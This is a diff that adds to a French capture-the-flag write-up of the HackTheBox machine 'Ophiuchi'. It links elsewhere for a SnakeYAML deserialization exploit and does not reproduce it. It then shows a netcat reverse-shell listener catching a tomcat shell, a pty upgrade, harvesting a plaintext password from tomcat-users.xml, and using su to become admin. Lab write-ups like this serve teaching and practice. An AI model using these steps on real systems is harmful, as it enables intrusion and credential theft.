@@ -63,4 +63,39 @@ Résumé :
     Yaml yaml = new Yaml();
     Object obj = yaml.load("Toutes les choses que vous entrées passent par ici");
     
- 
+ Sur ce [site](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858), cela explique comment organiser cela et exécuter des commandes, je vais pas vous le montrer ici. C'est un jeu d'enfant.
+
+# tomcat > admin
+
+En suivant les instructions du site, nous avons pu avoir un shell en tant que `tomcat`.
+
+    root@kali:~/htb/Ophiuchi# nc -lvnp 4242
+    listening on [any] 4242 ...
+    connect to [10.10.14.19] from (UNKNOWN) [10.10.10.227] 57092
+    /bin/sh: 0: can't access tty; job control turned off
+    $ id
+    uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+
+Je vais également lancer `tty` pour avoir un shell en `bash` et plus propre.
+
+    $ python3 -c "import pty;pty.spawn('/bin/bash')"
+    
+    
+La première chose que je fais tout le temps lorsque j'ai un shell en tant que `tomcat`, je regarde automatiquement le fichier de configuration qui comporte le mot de passe pour voir ce que je peux en faire avec.
+
+    tomcat@ophiuchi:~$ cat ~/conf/tomcat-users.xml|grep password
+    <user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
+    [...SNIP...]
+
+L'utilisateur est `admin` et le mot de passe est `whythereisalimit`, je vais voir si l'utilisateur `admin` existe dans le système :
+
+    tomcat@ophiuchi:~/conf$ awk -F: '{print $1, $7}' /etc/passwd|grep bash
+    root /bin/bash
+    admin /bin/bash
+
+En utilisant la commande `su` essayons si cela fonctionne :
+
+    tomcat@ophiuchi:~/conf$ su - admin
+    Password: whythereisalimit
+    admin@ophiuchi:~$
+    
